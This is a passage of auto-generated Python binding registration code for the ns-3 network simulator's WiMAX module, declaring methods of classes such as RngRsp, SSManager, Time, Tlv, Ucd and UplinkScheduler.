cls.add_method('GetReqDlBurstProfile',
'uint8_t',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('PrintDebug',
'void',
[],
is_const=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
cls.add_method('SetMacAddress',
'void',
[param('ns3::Mac48Address', 'macAddress')])
cls.add_method('SetRangingAnomalies',
'void',
[param('uint8_t', 'rangingAnomalies')])
cls.add_method('SetReqDlBurstProfile',
'void',
[param('uint8_t', 'reqDlBurstProfile')])
return
def register_Ns3RngRsp_methods(root_module, cls):
cls.add_constructor([param('ns3::RngRsp const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetAasBdcastPermission',
'uint8_t',
[],
is_const=True)
cls.add_method('GetBasicCid',
'ns3::Cid',
[],
is_const=True)
cls.add_method('GetDlFreqOverride',
'uint32_t',
[],
is_const=True)
cls.add_method('GetDlOperBurstProfile',
'uint16_t',
[],
is_const=True)
cls.add_method('GetFrameNumber',
'uint32_t',
[],
is_const=True)
cls.add_method('GetInitRangOppNumber',
'uint8_t',
[],
is_const=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetMacAddress',
'ns3::Mac48Address',
[],
is_const=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True)
cls.add_method('GetOffsetFreqAdjust',
'uint32_t',
[],
is_const=True)
cls.add_method('GetPowerLevelAdjust',
'uint8_t',
[],
is_const=True)
cls.add_method('GetPrimaryCid',
'ns3::Cid',
[],
is_const=True)
cls.add_method('GetRangStatus',
'uint8_t',
[],
is_const=True)
cls.add_method('GetRangSubchnl',
'uint8_t',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetTimingAdjust',
'uint32_t',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('GetUlChnlIdOverride',
'uint8_t',
[],
is_const=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
cls.add_method('SetAasBdcastPermission',
'void',
[param('uint8_t', 'aasBdcastPermission')])
cls.add_method('SetBasicCid',
'void',
[param('ns3::Cid', 'basicCid')])
cls.add_method('SetDlFreqOverride',
'void',
[param('uint32_t', 'dlFreqOverride')])
cls.add_method('SetDlOperBurstProfile',
'void',
[param('uint16_t', 'dlOperBurstProfile')])
cls.add_method('SetFrameNumber',
'void',
[param('uint32_t', 'frameNumber')])
cls.add_method('SetInitRangOppNumber',
'void',
[param('uint8_t', 'initRangOppNumber')])
cls.add_method('SetMacAddress',
'void',
[param('ns3::Mac48Address', 'macAddress')])
cls.add_method('SetOffsetFreqAdjust',
'void',
[param('uint32_t', 'offsetFreqAdjust')])
cls.add_method('SetPowerLevelAdjust',
'void',
[param('uint8_t', 'powerLevelAdjust')])
cls.add_method('SetPrimaryCid',
'void',
[param('ns3::Cid', 'primaryCid')])
cls.add_method('SetRangStatus',
'void',
[param('uint8_t', 'rangStatus')])
cls.add_method('SetRangSubchnl',
'void',
[param('uint8_t', 'rangSubchnl')])
cls.add_method('SetTimingAdjust',
'void',
[param('uint32_t', 'timingAdjust')])
cls.add_method('SetUlChnlIdOverride',
'void',
[param('uint8_t', 'ulChnlIdOverride')])
return
def register_Ns3SSManager_methods(root_module, cls):
cls.add_constructor([param('ns3::SSManager const &', 'arg0')])
cls.add_constructor([])
cls.add_method('CreateSSRecord',
'ns3::SSRecord *',
[param('ns3::Mac48Address const &', 'macAddress')])
cls.add_method('DeleteSSRecord',
'void',
[param('ns3::Cid', 'cid')])
cls.add_method('GetMacAddress',
'ns3::Mac48Address',
[param('ns3::Cid', 'cid')],
is_const=True)
cls.add_method('GetNRegisteredSSs',
'uint32_t',
[],
is_const=True)
cls.add_method('GetNSSs',
'uint32_t',
[],
is_const=True)
cls.add_method('GetSSRecord',
'ns3::SSRecord *',
[param('ns3::Mac48Address const &', 'macAddress')],
is_const=True)
cls.add_method('GetSSRecord',
'ns3::SSRecord *',
[param('ns3::Cid', 'cid')],
is_const=True)
cls.add_method('GetSSRecords',
'std::vector< ns3::SSRecord * > *',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('IsInRecord',
'bool',
[param('ns3::Mac48Address const &', 'macAddress')],
is_const=True)
cls.add_method('IsRegistered',
'bool',
[param('ns3::Mac48Address const &', 'macAddress')],
is_const=True)
return
def register_Ns3ServiceFlowManager_methods(root_module, cls):
cls.add_constructor([param('ns3::ServiceFlowManager const &', 'arg0')])
cls.add_constructor([])
cls.add_method('AddServiceFlow',
'void',
[param('ns3::ServiceFlow *', 'serviceFlow')])
cls.add_method('AreServiceFlowsAllocated',
'bool',
[])
cls.add_method('AreServiceFlowsAllocated',
'bool',
[param('std::vector< ns3::ServiceFlow * > *', 'serviceFlows')])
cls.add_method('AreServiceFlowsAllocated',
'bool',
[param('std::vector< ns3::ServiceFlow * >', 'serviceFlows')])
cls.add_method('DoClassify',
'ns3::ServiceFlow *',
[param('ns3::Ipv4Address', 'SrcAddress'), param('ns3::Ipv4Address', 'DstAddress'), param('uint16_t', 'SrcPort'), param('uint16_t', 'DstPort'), param('uint8_t', 'Proto'), param('ns3::ServiceFlow::Direction', 'dir')],
is_const=True)
cls.add_method('DoDispose',
'void',
[],
is_virtual=True)
cls.add_method('GetNextServiceFlowToAllocate',
'ns3::ServiceFlow *',
[])
cls.add_method('GetNrServiceFlows',
'uint32_t',
[],
is_const=True)
cls.add_method('GetServiceFlow',
'ns3::ServiceFlow *',
[param('uint32_t', 'sfid')],
is_const=True)
cls.add_method('GetServiceFlow',
'ns3::ServiceFlow *',
[param('ns3::Cid', 'cid')],
is_const=True)
cls.add_method('GetServiceFlows',
'std::vector< ns3::ServiceFlow * >',
[param('ns3::ServiceFlow::SchedulingType', 'schedulingType')],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
return
def register_Ns3SfVectorTlvValue_methods(root_module, cls):
cls.add_constructor([param('ns3::SfVectorTlvValue const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Copy',
'ns3::SfVectorTlvValue *',
[],
is_const=True, is_virtual=True)
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLength')],
is_virtual=True)
return
def register_Ns3SimpleRefCount__Ns3AttributeAccessor_Ns3Empty_Ns3DefaultDeleter__lt__ns3AttributeAccessor__gt___methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::SimpleRefCount< ns3::AttributeAccessor, ns3::empty, ns3::DefaultDeleter< ns3::AttributeAccessor > > const &', 'o')])
cls.add_method('Cleanup',
'void',
[],
is_static=True)
return
def register_Ns3SimpleRefCount__Ns3AttributeChecker_Ns3Empty_Ns3DefaultDeleter__lt__ns3AttributeChecker__gt___methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::SimpleRefCount< ns3::AttributeChecker, ns3::empty, ns3::DefaultDeleter< ns3::AttributeChecker > > const &', 'o')])
cls.add_method('Cleanup',
'void',
[],
is_static=True)
return
def register_Ns3SimpleRefCount__Ns3AttributeValue_Ns3Empty_Ns3DefaultDeleter__lt__ns3AttributeValue__gt___methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::SimpleRefCount< ns3::AttributeValue, ns3::empty, ns3::DefaultDeleter< ns3::AttributeValue > > const &', 'o')])
cls.add_method('Cleanup',
'void',
[],
is_static=True)
return
def register_Ns3SimpleRefCount__Ns3CallbackImplBase_Ns3Empty_Ns3DefaultDeleter__lt__ns3CallbackImplBase__gt___methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::SimpleRefCount< ns3::CallbackImplBase, ns3::empty, ns3::DefaultDeleter< ns3::CallbackImplBase > > const &', 'o')])
cls.add_method('Cleanup',
'void',
[],
is_static=True)
return
def register_Ns3SimpleRefCount__Ns3EventImpl_Ns3Empty_Ns3DefaultDeleter__lt__ns3EventImpl__gt___methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::SimpleRefCount< ns3::EventImpl, ns3::empty, ns3::DefaultDeleter< ns3::EventImpl > > const &', 'o')])
cls.add_method('Cleanup',
'void',
[],
is_static=True)
return
def register_Ns3SimpleRefCount__Ns3NixVector_Ns3Empty_Ns3DefaultDeleter__lt__ns3NixVector__gt___methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::SimpleRefCount< ns3::NixVector, ns3::empty, ns3::DefaultDeleter< ns3::NixVector > > const &', 'o')])
cls.add_method('Cleanup',
'void',
[],
is_static=True)
return
def register_Ns3SimpleRefCount__Ns3OutputStreamWrapper_Ns3Empty_Ns3DefaultDeleter__lt__ns3OutputStreamWrapper__gt___methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::SimpleRefCount< ns3::OutputStreamWrapper, ns3::empty, ns3::DefaultDeleter< ns3::OutputStreamWrapper > > const &', 'o')])
cls.add_method('Cleanup',
'void',
[],
is_static=True)
return
def register_Ns3SimpleRefCount__Ns3Packet_Ns3Empty_Ns3DefaultDeleter__lt__ns3Packet__gt___methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::SimpleRefCount< ns3::Packet, ns3::empty, ns3::DefaultDeleter< ns3::Packet > > const &', 'o')])
cls.add_method('Cleanup',
'void',
[],
is_static=True)
return
def register_Ns3SimpleRefCount__Ns3TraceSourceAccessor_Ns3Empty_Ns3DefaultDeleter__lt__ns3TraceSourceAccessor__gt___methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::SimpleRefCount< ns3::TraceSourceAccessor, ns3::empty, ns3::DefaultDeleter< ns3::TraceSourceAccessor > > const &', 'o')])
cls.add_method('Cleanup',
'void',
[],
is_static=True)
return
def register_Ns3SsServiceFlowManager_methods(root_module, cls):
cls.add_constructor([param('ns3::SsServiceFlowManager const &', 'arg0')])
cls.add_constructor([param('ns3::Ptr< ns3::SubscriberStationNetDevice >', 'device')])
cls.add_method('AddServiceFlow',
'void',
[param('ns3::ServiceFlow *', 'serviceFlow')])
cls.add_method('AddServiceFlow',
'void',
[param('ns3::ServiceFlow', 'serviceFlow')])
cls.add_method('CreateDsaAck',
'ns3::Ptr< ns3::Packet >',
[])
cls.add_method('CreateDsaReq',
'ns3::DsaReq',
[param('ns3::ServiceFlow const *', 'serviceFlow')])
cls.add_method('DoDispose',
'void',
[],
is_virtual=True)
cls.add_method('GetDsaAckTimeoutEvent',
'ns3::EventId',
[],
is_const=True)
cls.add_method('GetDsaRspTimeoutEvent',
'ns3::EventId',
[],
is_const=True)
cls.add_method('GetMaxDsaReqRetries',
'uint8_t',
[],
is_const=True)
cls.add_method('InitiateServiceFlows',
'void',
[])
cls.add_method('ProcessDsaRsp',
'void',
[param('ns3::DsaRsp const &', 'dsaRsp')])
cls.add_method('ScheduleDsaReq',
'void',
[param('ns3::ServiceFlow const *', 'serviceFlow')])
cls.add_method('SetMaxDsaReqRetries',
'void',
[param('uint8_t', 'maxDsaReqRetries')])
return
def register_Ns3ThreeLogDistancePropagationLossModel_methods(root_module, cls):
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_constructor([])
cls.add_method('DoCalcRxPower',
'double',
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],
is_const=True, visibility='private', is_virtual=True)
return
def register_Ns3Time_methods(root_module, cls):
cls.add_binary_comparison_operator('!=')
cls.add_inplace_numeric_operator('+=', param('ns3::Time const &', 'right'))
cls.add_binary_numeric_operator('+', root_module['ns3::Time'], root_module['ns3::Time'], param('ns3::Time const &', 'right'))
cls.add_binary_numeric_operator('-', root_module['ns3::Time'], root_module['ns3::Time'], param('ns3::Time const &', 'right'))
cls.add_binary_comparison_operator('<')
cls.add_binary_comparison_operator('>')
cls.add_inplace_numeric_operator('-=', param('ns3::Time const &', 'right'))
cls.add_output_stream_operator()
cls.add_binary_comparison_operator('<=')
cls.add_binary_comparison_operator('==')
cls.add_binary_comparison_operator('>=')
cls.add_constructor([])
cls.add_constructor([param('ns3::Time const &', 'o')])
cls.add_constructor([param('double', 'v')])
cls.add_constructor([param('int', 'v')])
cls.add_constructor([param('long int', 'v')])
cls.add_constructor([param('long long int', 'v')])
cls.add_constructor([param('unsigned int', 'v')])
cls.add_constructor([param('long unsigned int', 'v')])
cls.add_constructor([param('long long unsigned int', 'v')])
cls.add_constructor([param('std::string const &', 's')])
cls.add_constructor([param('ns3::int64x64_t const &', 'value')])
cls.add_method('Compare',
'int',
[param('ns3::Time const &', 'o')],
is_const=True)
cls.add_method('From',
'ns3::Time',
[param('ns3::int64x64_t const &', 'from'), param('ns3::Time::Unit', 'timeUnit')],
is_static=True)
cls.add_method('From',
'ns3::Time',
[param('ns3::int64x64_t const &', 'value')],
is_static=True)
cls.add_method('FromDouble',
'ns3::Time',
[param('double', 'value'), param('ns3::Time::Unit', 'timeUnit')],
is_static=True)
cls.add_method('FromInteger',
'ns3::Time',
[param('uint64_t', 'value'), param('ns3::Time::Unit', 'timeUnit')],
is_static=True)
cls.add_method('GetDouble',
'double',
[],
is_const=True)
cls.add_method('GetFemtoSeconds',
'int64_t',
[],
is_const=True)
cls.add_method('GetInteger',
'int64_t',
[],
is_const=True)
cls.add_method('GetMicroSeconds',
'int64_t',
[],
is_const=True)
cls.add_method('GetMilliSeconds',
'int64_t',
[],
is_const=True)
cls.add_method('GetNanoSeconds',
'int64_t',
[],
is_const=True)
cls.add_method('GetPicoSeconds',
'int64_t',
[],
is_const=True)
cls.add_method('GetResolution',
'ns3::Time::Unit',
[],
is_static=True)
cls.add_method('GetSeconds',
'double',
[],
is_const=True)
cls.add_method('GetTimeStep',
'int64_t',
[],
is_const=True)
cls.add_method('IsNegative',
'bool',
[],
is_const=True)
cls.add_method('IsPositive',
'bool',
[],
is_const=True)
cls.add_method('IsStrictlyNegative',
'bool',
[],
is_const=True)
cls.add_method('IsStrictlyPositive',
'bool',
[],
is_const=True)
cls.add_method('IsZero',
'bool',
[],
is_const=True)
cls.add_method('SetResolution',
'void',
[param('ns3::Time::Unit', 'resolution')],
is_static=True)
cls.add_method('To',
'ns3::int64x64_t',
[param('ns3::Time::Unit', 'timeUnit')],
is_const=True)
cls.add_method('ToDouble',
'double',
[param('ns3::Time::Unit', 'timeUnit')],
is_const=True)
cls.add_method('ToInteger',
'int64_t',
[param('ns3::Time::Unit', 'timeUnit')],
is_const=True)
return
def register_Ns3Tlv_methods(root_module, cls):
cls.add_constructor([param('uint8_t', 'type'), param('uint64_t', 'length'), param('ns3::TlvValue const &', 'value')])
cls.add_constructor([])
cls.add_constructor([param('ns3::Tlv const &', 'tlv')])
cls.add_method('Copy',
'ns3::Tlv *',
[],
is_const=True)
cls.add_method('CopyValue',
'ns3::TlvValue *',
[],
is_const=True)
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetLength',
'uint64_t',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetSizeOfLen',
'uint8_t',
[],
is_const=True)
cls.add_method('GetType',
'uint8_t',
[],
is_const=True)
cls.add_method('PeekValue',
'ns3::TlvValue *',
[])
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
return
def register_Ns3TraceSourceAccessor_methods(root_module, cls):
cls.add_constructor([param('ns3::TraceSourceAccessor const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Connect',
'bool',
[param('ns3::ObjectBase *', 'obj', transfer_ownership=False), param('std::string', 'context'), param('ns3::CallbackBase const &', 'cb')],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('ConnectWithoutContext',
'bool',
[param('ns3::ObjectBase *', 'obj', transfer_ownership=False), param('ns3::CallbackBase const &', 'cb')],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('Disconnect',
'bool',
[param('ns3::ObjectBase *', 'obj', transfer_ownership=False), param('std::string', 'context'), param('ns3::CallbackBase const &', 'cb')],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('DisconnectWithoutContext',
'bool',
[param('ns3::ObjectBase *', 'obj', transfer_ownership=False), param('ns3::CallbackBase const &', 'cb')],
is_pure_virtual=True, is_const=True, is_virtual=True)
return
def register_Ns3Trailer_methods(root_module, cls):
cls.add_output_stream_operator()
cls.add_constructor([])
cls.add_constructor([param('ns3::Trailer const &', 'arg0')])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'end')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_pure_virtual=True, is_const=True, is_virtual=True)
return
def register_Ns3TwoRayGroundPropagationLossModel_methods(root_module, cls):
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_constructor([])
cls.add_method('SetLambda',
'void',
[param('double', 'frequency'), param('double', 'speed')])
cls.add_method('SetLambda',
'void',
[param('double', 'lambda')])
cls.add_method('SetSystemLoss',
'void',
[param('double', 'systemLoss')])
cls.add_method('SetMinDistance',
'void',
[param('double', 'minDistance')])
cls.add_method('GetMinDistance',
'double',
[],
is_const=True)
cls.add_method('GetLambda',
'double',
[],
is_const=True)
cls.add_method('GetSystemLoss',
'double',
[],
is_const=True)
cls.add_method('SetHeightAboveZ',
'void',
[param('double', 'heightAboveZ')])
cls.add_method('DoCalcRxPower',
'double',
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],
is_const=True, visibility='private', is_virtual=True)
return
def register_Ns3Ucd_methods(root_module, cls):
cls.add_constructor([param('ns3::Ucd const &', 'arg0')])
cls.add_constructor([])
cls.add_method('AddUlBurstProfile',
'void',
[param('ns3::OfdmUlBurstProfile', 'ulBurstProfile')])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetChannelEncodings',
'ns3::OfdmUcdChannelEncodings',
[],
is_const=True)
cls.add_method('GetConfigurationChangeCount',
'uint8_t',
[],
is_const=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True)
cls.add_method('GetNrUlBurstProfiles',
'uint8_t',
[],
is_const=True)
cls.add_method('GetRangingBackoffEnd',
'uint8_t',
[],
is_const=True)
cls.add_method('GetRangingBackoffStart',
'uint8_t',
[],
is_const=True)
cls.add_method('GetRequestBackoffEnd',
'uint8_t',
[],
is_const=True)
cls.add_method('GetRequestBackoffStart',
'uint8_t',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('GetUlBurstProfiles',
'std::vector< ns3::OfdmUlBurstProfile >',
[],
is_const=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
cls.add_method('SetChannelEncodings',
'void',
[param('ns3::OfdmUcdChannelEncodings', 'channelEncodings')])
cls.add_method('SetConfigurationChangeCount',
'void',
[param('uint8_t', 'ucdCount')])
cls.add_method('SetNrUlBurstProfiles',
'void',
[param('uint8_t', 'nrUlBurstProfiles')])
cls.add_method('SetRangingBackoffEnd',
'void',
[param('uint8_t', 'rangingBackoffEnd')])
cls.add_method('SetRangingBackoffStart',
'void',
[param('uint8_t', 'rangingBackoffStart')])
cls.add_method('SetRequestBackoffEnd',
'void',
[param('uint8_t', 'requestBackoffEnd')])
cls.add_method('SetRequestBackoffStart',
'void',
[param('uint8_t', 'requestBackoffStart')])
return
def register_Ns3UlJob_methods(root_module, cls):
cls.add_binary_comparison_operator('==')
cls.add_constructor([param('ns3::UlJob const &', 'arg0')])
cls.add_constructor([])
cls.add_method('GetDeadline',
'ns3::Time',
[])
cls.add_method('GetPeriod',
'ns3::Time',
[])
cls.add_method('GetReleaseTime',
'ns3::Time',
[])
cls.add_method('GetSchedulingType',
'ns3::ServiceFlow::SchedulingType',
[])
cls.add_method('GetServiceFlow',
'ns3::ServiceFlow *',
[])
cls.add_method('GetSize',
'uint32_t',
[])
cls.add_method('GetSsRecord',
'ns3::SSRecord *',
[])
cls.add_method('GetType',
'ns3::ReqType',
[])
cls.add_method('SetDeadline',
'void',
[param('ns3::Time', 'deadline')])
cls.add_method('SetPeriod',
'void',
[param('ns3::Time', 'period')])
cls.add_method('SetReleaseTime',
'void',
[param('ns3::Time', 'releaseTime')])
cls.add_method('SetSchedulingType',
'void',
[param('ns3::ServiceFlow::SchedulingType', 'schedulingType')])
cls.add_method('SetServiceFlow',
'void',
[param('ns3::ServiceFlow *', 'serviceFlow')])
cls.add_method('SetSize',
'void',
[param('uint32_t', 'size')])
cls.add_method('SetSsRecord',
'void',
[param('ns3::SSRecord *', 'ssRecord')])
cls.add_method('SetType',
'void',
[param('ns3::ReqType', 'type')])
return
def register_Ns3UlMap_methods(root_module, cls):
cls.add_constructor([param('ns3::UlMap const &', 'arg0')])
cls.add_constructor([])
cls.add_method('AddUlMapElement',
'void',
[param('ns3::OfdmUlMapIe', 'ulMapElement')])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetAllocationStartTime',
'uint32_t',
[],
is_const=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('GetUcdCount',
'uint8_t',
[],
is_const=True)
cls.add_method('GetUlMapElements',
'std::list< ns3::OfdmUlMapIe >',
[],
is_const=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
cls.add_method('SetAllocationStartTime',
'void',
[param('uint32_t', 'allocationStartTime')])
cls.add_method('SetUcdCount',
'void',
[param('uint8_t', 'ucdCount')])
return
def register_Ns3UplinkScheduler_methods(root_module, cls):
cls.add_constructor([param('ns3::UplinkScheduler const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('ns3::Ptr< ns3::BaseStationNetDevice >', 'bs')])
cls.add_method('AddUplinkAllocation',
'void',
[param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('uint32_t const &', 'allocationSize'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('AllocateInitialRangingInterval',
'void',
[param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('CalculateAllocationStartTime',
'uint32_t',
[],
is_pure_virtual=True, is_virtual=True)
cls.add_method('GetBs',
'ns3::Ptr< ns3::BaseStationNetDevice >',
[],
is_virtual=True)
cls.add_method('GetChannelDescriptorsToUpdate',
'void',
[param('bool &', 'arg0'), param('bool &', 'arg1'), param('bool &', 'arg2'), param('bool &', 'arg3')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('GetDcdTimeStamp',
'ns3::Time',
[],
is_const=True, is_virtual=True)
cls.add_method('GetIsInvIrIntrvlAllocated',
'bool',
[],
is_const=True, is_virtual=True)
cls.add_method('GetIsIrIntrvlAllocated',
'bool',
[],
is_const=True, is_virtual=True)
cls.add_method('GetNrIrOppsAllocated',
'uint8_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetTimeStampIrInterval',
'ns3::Time',
[],
is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('GetUcdTimeStamp',
'ns3::Time',
[],
is_const=True, is_virtual=True)
cls.add_method('GetUplinkAllocations',
'std::list< ns3::OfdmUlMapIe >',
[],
is_const=True, is_virtual=True)
cls.add_method('InitOnce',
'void',
[],
is_pure_virtual=True, is_virtual=True)
cls.add_method('OnSetRequestedBandwidth',
'void',
[param('ns3::ServiceFlowRecord *', 'sfr')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('ProcessBandwidthRequest',
'void',
[param('ns3::BandwidthRequestHeader const &', 'bwRequestHdr')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('Schedule',
'void',
[],
is_pure_virtual=True, is_virtual=True)
cls.add_method('ServiceBandwidthRequests',
'void',
[param('ns3::SSRecord const *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('ServiceBandwidthRequests',
'bool',
[param('ns3::ServiceFlow *', 'serviceFlow'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('ServiceUnsolicitedGrants',
'void',
[param('ns3::SSRecord const *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('SetBs',
'void',
[param('ns3::Ptr< ns3::BaseStationNetDevice >', 'bs')],
is_virtual=True)
cls.add_method('SetDcdTimeStamp',
'void',
[param('ns3::Time', 'dcdTimeStamp')],
is_virtual=True)
cls.add_method('SetIsInvIrIntrvlAllocated',
'void',
[param('bool', 'isInvIrIntrvlAllocated')],
is_virtual=True)
cls.add_method('SetIsIrIntrvlAllocated',
'void',
[param('bool', 'isIrIntrvlAllocated')],
is_virtual=True)
cls.add_method('SetNrIrOppsAllocated',
'void',
[param('uint8_t', 'nrIrOppsAllocated')],
is_virtual=True)
cls.add_method('SetTimeStampIrInterval',
'void',
[param('ns3::Time', 'timeStampIrInterval')],
is_virtual=True)
cls.add_method('SetUcdTimeStamp',
'void',
[param('ns3::Time', 'ucdTimeStamp')],
is_virtual=True)
cls.add_method('SetupServiceFlow',
'void',
[param('ns3::SSRecord *', 'ssRecord'), param('ns3::ServiceFlow *', 'serviceFlow')],
is_pure_virtual=True, is_virtual=True)
return
def register_Ns3UplinkSchedulerMBQoS_methods(root_module, cls):
cls.add_constructor([param('ns3::UplinkSchedulerMBQoS const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('ns3::Time', 'time')])
cls.add_method('AddUplinkAllocation',
'void',
[param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('uint32_t const &', 'allocationSize'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_virtual=True)
cls.add_method('AllocateInitialRangingInterval',
'void',
[param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_virtual=True)
cls.add_method('CalculateAllocationStartTime',
'uint32_t',
[],
is_virtual=True)
cls.add_method('CheckDeadline',
'void',
[param('uint32_t &', 'availableSymbols')])
cls.add_method('CheckMinimumBandwidth',
'void',
[param('uint32_t &', 'availableSymbols')])
cls.add_method('CountSymbolsJobs',
'uint32_t',
[param('ns3::Ptr< ns3::UlJob >', 'job')])
cls.add_method('CountSymbolsQueue',
'uint32_t',
[param('std::list< ns3::Ptr< ns3::UlJob > >', 'jobs')])
cls.add_method('CreateUlJob',
'ns3::Ptr< ns3::UlJob >',
[param('ns3::SSRecord *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedType'), param('ns3::ReqType', 'reqType')])
cls.add_method('DequeueJob',
'ns3::Ptr< ns3::UlJob >',
[param('ns3::UlJob::JobPriority', 'priority')])
cls.add_method('DetermineDeadline',
'ns3::Time',
[param('ns3::ServiceFlow *', 'serviceFlow')])
cls.add_method('EnqueueJob',
'void',
[param('ns3::UlJob::JobPriority', 'priority'), param('ns3::Ptr< ns3::UlJob >', 'job')])
